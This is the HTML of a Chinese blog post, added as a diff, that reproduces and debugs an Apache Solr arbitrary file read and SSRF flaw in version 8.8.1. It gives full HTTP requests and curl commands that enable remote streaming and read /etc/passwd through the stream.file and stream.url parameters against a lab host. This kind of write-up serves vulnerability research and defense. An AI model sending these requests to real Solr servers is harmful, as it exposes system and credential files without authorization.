@@ -1,0 +1,123 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="/images/favicon-16x16.png?v=2.1.1" type="image/png" sizes="16x16"><link rel="icon" href="/images/favicon-32x32.png?v=2.1.1" type="image/png" sizes="32x32"><meta name="description" content="漏洞简介        这几天 Skay 师傅 发布了一篇文章 Apache Solr 组件安全概览 对 Apache Solr 的历史漏洞做了个详细的分析，同时也公布了一个未被官方所承认的漏洞，网络上也有很多文章进行复现，但是对之分析的文章并不是很多，于是想结合本地进行调试尝试。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Apache Solr任意文件读取">
+<meta property="og:url" content="http://yoursite.com/2021/03/18/Apache%20Solr%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/Apache%20Solr%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/index.html">
+<meta property="og:site_name" content="Whippet&#39;s Blog">
+<meta property="og:description" content="漏洞简介        这几天 Skay 师傅 发布了一篇文章 Apache Solr 组件安全概览 对 Apache Solr 的历史漏洞做了个详细的分析，同时也公布了一个未被官方所承认的漏洞，网络上也有很多文章进行复现，但是对之分析的文章并不是很多，于是想结合本地进行调试尝试。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://yoursite.com/2021/03/18/Apache%20Solr%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/Apache%20Solr%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/20210323142110.png">
+<meta property="og:image" content="http://yoursite.com/2021/03/18/Apache%20Solr%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/Apache%20Solr%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/20210323142358.png">
+<meta property="og:image" content="http://yoursite.com/2021/03/18/Apache%20Solr%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/Apache%20Solr%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/20210323143005.png">
+<meta property="og:image" content="http://yoursite.com/2021/03/18/Apache%20Solr%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/Apache%20Solr%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/20210323144819.png">
+<meta property="og:image" content="http://yoursite.com/2021/03/18/Apache%20Solr%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/Apache%20Solr%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/20210323144928.png">
+<meta property="og:image" content="http://yoursite.com/2021/03/18/Apache%20Solr%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/Apache%20Solr%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/20210323153301.png">
+<meta property="og:image" content="http://yoursite.com/2021/03/18/Apache%20Solr%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/Apache%20Solr%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/20210323153720.png">
+<meta property="og:image" content="http://yoursite.com/2021/03/18/Apache%20Solr%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/Apache%20Solr%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/20210323154806.png">
+<meta property="og:image" content="http://yoursite.com/2021/03/18/Apache%20Solr%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/Apache%20Solr%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/20210323155828.png">
+<meta property="og:image" content="http://yoursite.com/2021/03/18/Apache%20Solr%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/Apache%20Solr%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/20210323160042.png">
+<meta property="article:published_time" content="2021-03-18T07:24:52.000Z">
+<meta property="article:modified_time" content="2021-03-23T08:15:53.070Z">
+<meta property="article:author" content="whippet">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yoursite.com/2021/03/18/Apache%20Solr%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/Apache%20Solr%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/20210323142110.png"><title>Apache Solr任意文件读取 | Whippet's Blog</title><link ref="canonical" href="http://yoursite.com/2021/03/18/Apache%20Solr%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/Apache%20Solr%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.1.1"><script>var Stun = window.Stun || {};
+var CONFIG = {
+  root: '/',
+  algolia: undefined,
+  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
+  sidebar: {"offsetTop":"20px","tocMaxDepth":6},
+  header: {"enable":true,"showOnPost":true,"scrollDownIcon":false},
+  postWidget: {"endText":true},
+  nightMode: undefined,
+  back2top: {"enable":true},
+  codeblock: {"style":"carbon","highlight":"light","wordWrap":false},
+  reward: false,
+  fancybox: false,
+  zoomImage: {"gapAside":"20px"},
+  galleryWaterfall: undefined,
+  lazyload: false,
+  pjax: undefined,
+  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
+  shortcuts: undefined,
+  prompt: {"copyButton":"复制","copySuccess":"复制成功","copyError":"复制失败"},
+  sourcePath: {"js":"js","css":"css","images":"images"},
+};
+
+window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.1.1"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">首页</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">归档</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/tags/"><span class="header-nav-menu-item__icon"><i class="fas fa-tags"></i></span><span class="header-nav-menu-item__text">标签</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/friendship/"><span class="header-nav-menu-item__icon"><i class="fas fa-link"></i></span><span class="header-nav-menu-item__text">友链</span></a></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">Whippet's Blog</div><div class="header-banner-info__subtitle"></div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><h1 class="post-title">Apache Solr任意文件读取</h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2021-03-18</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2021-03-23</span></span></div></header><div class="post-body"><h2 id="漏洞简介">
+          <a href="#漏洞简介" class="heading-link"><i class="fas fa-link"></i></a>漏洞简介</h2>
+      
+<p>这几天 Skay 师傅 发布了一篇文章 <span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/3WuWUGO61gM0dBpwqTfenQ">Apache Solr 组件安全概览</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 对 Apache Solr 的历史漏洞做了个详细的分析，同时也公布了一个未被官方所承认的漏洞，网络上也有很多文章进行复现，但是对之分析的文章并不是很多，于是想结合本地进行调试尝试。</p>
+<a id="more"></a>
+<p>Apache Solr 是一个开源的搜索服务，使用 Java 语言开发。Apache Solr 的某些功能存在过滤不严格，在 Apache Solr 未开启认证的情况下，攻击者可直接构造特定请求开启特定配置，并最终造成 SSRF 和任意文件读取漏洞。</p>
+
+        <h2 id="漏洞复现">
+          <a href="#漏洞复现" class="heading-link"><i class="fas fa-link"></i></a>漏洞复现</h2>
+      
+<p>环境搭建，下载符合存在的漏洞的 Apache 漏洞版本：<span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="http://archive.apache.org/dist/lucene/solr/8.8.1/">Apache Solr 8.8.1</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>，同时下载源码文件和二进制文件，方便进行调试。之前曾对 <span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://whippet0.github.io/2020/10/26/CVE-2020-13957%20Apche%20Solr%20%E6%9C%AA%E6%8E%88%E6%9D%83%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/">CVE-2020-13957 Apche Solr 未授权上传漏洞</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 进行过简单的分析，但是时间过去了好久，一些相关的操作都忘记了，之前也是完全利用在 windows 系统上进行调试，这一次尝试利用 linux 进行调试分析。</p>
+<figure class="highlight plain"><div class="table-container"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">tar -zxvf  solr-8.8.1.tgz #解压文件     </span><br><span class="line">cd  /solr-8.8.1/bin/   </span><br><span class="line">./solr -c -f -a "-Xdebug -Xrunjdwp:transport=dt_socket,server=y,suspend=n,address=18522" -p 8983 # 以Debug 模式启动   </span><br><span class="line">./solr create -c test_solr  #创建一个数据驱动模式的核心  </span><br></pre></td></tr></tbody></table></div></figure>
+<p>访问网站<br>
+<img src="/2021/03/18/Apache%20Solr%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/Apache%20Solr%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/20210323142110.png" alt=""></p>
+<p>我们需要首先获取 core 名称<br>
+<img src="/2021/03/18/Apache%20Solr%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/Apache%20Solr%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/20210323142358.png" alt=""></p>
+<p>漏洞的利用总共需要两步，首先利用 Config API 打开默认关闭的 requestDispatcher.requestParsers.enableRemoteStreaming 开关，之后再进行文件读取的操作。</p>
+<figure class="highlight shell"><div class="table-container"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">POST  /solr/test_solr_shard1_replica_n1/config/ HTTP/1.1</span><br><span class="line">Host: 192.168.176.171:8983</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 80</span><br><span class="line"></span><br><span class="line">{"set-property":{"requestDispatcher.requestParsers.enableRemoteStreaming":true}}</span><br></pre></td></tr></tbody></table></div></figure>
+<p><img src="/2021/03/18/Apache%20Solr%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/Apache%20Solr%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/20210323143005.png" alt=""></p>
+<p>SSRF 和任意文件读取漏洞在同一个 HTTP 请求中触发，分别对应着不同的参数<br>
+<code>stream.file参数触发任意文件读取漏洞</code></p>
+<figure class="highlight plain"><div class="table-container"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST /solr/test_solr_shard1_replica_n1/debug/dump?param=ContentStreams HTTP/1.1</span><br><span class="line">Host: 192.168.176.171:8983</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 24</span><br><span class="line"></span><br><span class="line">stream.file=//etc/passwd</span><br></pre></td></tr></tbody></table></div></figure>
+<p><img src="/2021/03/18/Apache%20Solr%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/Apache%20Solr%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/20210323144819.png" alt=""></p>
+<p><code>stream.url触发SSRF漏洞，Java中可利用file协议利用SSRF，可用来实现任意文件读取</code></p>
+<figure class="highlight plain"><div class="table-container"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST /solr/test_solr_shard1_replica_n1/debug/dump?param=ContentStreams HTTP/1.1</span><br><span class="line">Host: 192.168.176.171:8983</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 29</span><br><span class="line"></span><br><span class="line">stream.url=file:///etc/passwd</span><br></pre></td></tr></tbody></table></div></figure>
+<p><img src="/2021/03/18/Apache%20Solr%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/Apache%20Solr%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/20210323144928.png" alt=""></p>
+<p>Tips:在构造 POC 时，中间一度无法成功，直接复制别人的 POC 发送时是可以的，但是自己构造的数据包时却无法成功，经过逐行比较，发现我在构造数据包时没有添加这一句 <code>Content-Type: application/x-www-form-urlencoded</code><br>
+对于 “application/x-www-form-urlencoded” 其参数组织形式是键值对,name=zhangsan&amp;age=18<br>
+对于 “application/json” 其参数组织形式为，{name:“zhangsan”,age:“18”}</p>
+<p>通过 GET 请求去读取文件时，就没有这方面的问题，application/x-www-form-urlencoded 是浏览器通过页面表单方式提交时的编码格式，所以同通过 POST 去请求时，需要声明，负责服务器端无法接收提交的数据。</p>
+<p>通过 CURL 方式来利用漏洞</p>
+<ul>
+<li>curl <span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="http://192.168.176.171:8983/solr/admin/cores?wt=json">http://192.168.176.171:8983/solr/admin/cores?wt=json</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></li>
+<li>curl -d ‘{“set-property”:{“requestDispatcher.requestParsers.enableRemoteStreaming”:true}}’ <span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="http://192.168.176.171:8983/solr/test_solr_shard1_replica_n1/config">http://192.168.176.171:8983/solr/test_solr_shard1_replica_n1/config</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> -H ‘Content-type:application/json’</li>
+<li>curl “<span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="http://192.168.176.171:8983/solr/test_solr_shard1_replica_n1/debug/dump?param=ContentStreams">http://192.168.176.171:8983/solr/test_solr_shard1_replica_n1/debug/dump?param=ContentStreams</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>” -F “stream.url=file:///etc/passwd”</li>
+</ul>
+
+        <h2 id="漏洞分析">
+          <a href="#漏洞分析" class="heading-link"><i class="fas fa-link"></i></a>漏洞分析</h2>
+      
+<p><img src="/2021/03/18/Apache%20Solr%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/Apache%20Solr%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/20210323153301.png" alt=""><br>
+挖掘漏洞的话，应该要把这个产品的<span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://solr.apache.org/guide/8_0/content-streams.html">文档</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>先通读一遍，可以找出其中敏感的参数以及配置方法。<br>
+<img src="/2021/03/18/Apache%20Solr%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/Apache%20Solr%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/20210323153720.png" alt=""></p>
+<p>英语水平不是太强，只能看懂大概：通过 <code>enableRemoteStreaming="true"</code> 开启远程流，如果远程流被启用并请求处理过程中的URL的内容要求，每个内容stream.url和stream.file参数，并将其作为流通过。</p>
+<p>进行一下调试，对相关代码进行分析，启动 idea ，并配置远程调试<br>
+<img src="/2021/03/18/Apache%20Solr%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/Apache%20Solr%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/20210323154806.png" alt=""></p>
+<p><code>org.apache.solr.servlet.SolrRequestParsers#buildRequestFrom(SolrCore, SolrParams, Collection&lt;ContentStream&gt;, RTimerTree, HttpServletRequest)</code><br>
+<img src="/2021/03/18/Apache%20Solr%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/Apache%20Solr%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/20210323155828.png" alt=""><br>
+<img src="/2021/03/18/Apache%20Solr%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/Apache%20Solr%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/20210323160042.png" alt=""></p>
+
+        <h2 id="参考文章">
+          <a href="#参考文章" class="heading-link"><i class="fas fa-link"></i></a>参考文章</h2>
+      
+<p><span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://solr.apache.org/guide/8_0/content-streams.html">Solr参考指南8.0</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span><br>
+<span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/e-mJGxGSmnaN-NZQqyeI9Q">Apache Solr任意文件读取和SSRF漏洞的自动化挖掘</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span><br>
+<span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/3WuWUGO61gM0dBpwqTfenQ">Apache Solr 组件安全概览</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<script>
+        document.querySelectorAll('.github-emoji')
+          .forEach(el => {
+            if (!el.dataset.src) { return; }
+            const img = document.createElement('img');
+            img.style = 'display:none !important;';
+            img.src = el.dataset.src;
+            img.addEventListener('error', () => {
+              img.remove();
+              el.style.color = 'inherit';
+              el.style.backgroundImage = 'none';
+              el.style.background = 'none';
+            });
+            img.addEventListener('load', () => {
+              img.remove();
+            });
+            document.body.appendChild(img);
+          });
+      </script></div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ 本文结束，感谢您的阅读 ------</div></div><nav class="post-paginator paginator"><div class="paginator-next"><a class="paginator-next__link" href="/2021/03/03/CVE-2021-21972%20Vmware%20vcenter%E6%9C%AA%E6%8E%88%E6%9D%83%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"><span class="paginator-prev__text">CVE-2021-21972 Vmware vcenter未授权任意文件上传</span><span class="paginator-next__icon"><i class="fas fa-angle-right"></i></span></a></div></nav></footer></div></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><div class="sidebar-nav"><span class="sidebar-nav-toc current">文章目录</span><span class="sidebar-nav-ov">站点概览</span></div><section class="sidebar-toc"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B"><span class="toc-number">1.</span> <span class="toc-text">
+          漏洞简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-number">2.</span> <span class="toc-text">
+          漏洞复现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">3.</span> <span class="toc-text">
+          漏洞分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-number">4.</span> <span class="toc-text">
+          参考文章</span></a></li></ol></section><!-- ov = overview--><section class="sidebar-ov hide"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="/images/author_images.png" alt="avatar"></div><p class="sidebar-ov-author__text">按时吃饭</p></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">20</div><div class="sidebar-ov-state-item__name">归档</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--tags" href="/tags/"><div class="sidebar-ov-state-item__count">0</div><div class="sidebar-ov-state-item__name">标签</div></a></div></section><div class="sidebar-reading"><div class="sidebar-reading-info"><span class="sidebar-reading-info__text">你已阅读了 </span><span class="sidebar-reading-info__num">0</span><span>%</span></div><div class="sidebar-reading-line"></div></div></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2021</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>whippet</span></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script src="https://cdn.jsdelivr.net/npm/canvas-nest.js@1.0.1/dist/canvas-nest.min.js" color="0,0,0" opacity="0.6" count="99" zIndex="-1"></script><script src="/js/utils.js?v=2.1.1"></script><script src="/js/stun-boot.js?v=2.1.1"></script><script src="/js/scroll.js?v=2.1.1"></script><script src="/js/header.js?v=2.1.1"></script><script src="/js/sidebar.js?v=2.1.1"></script></body></html>
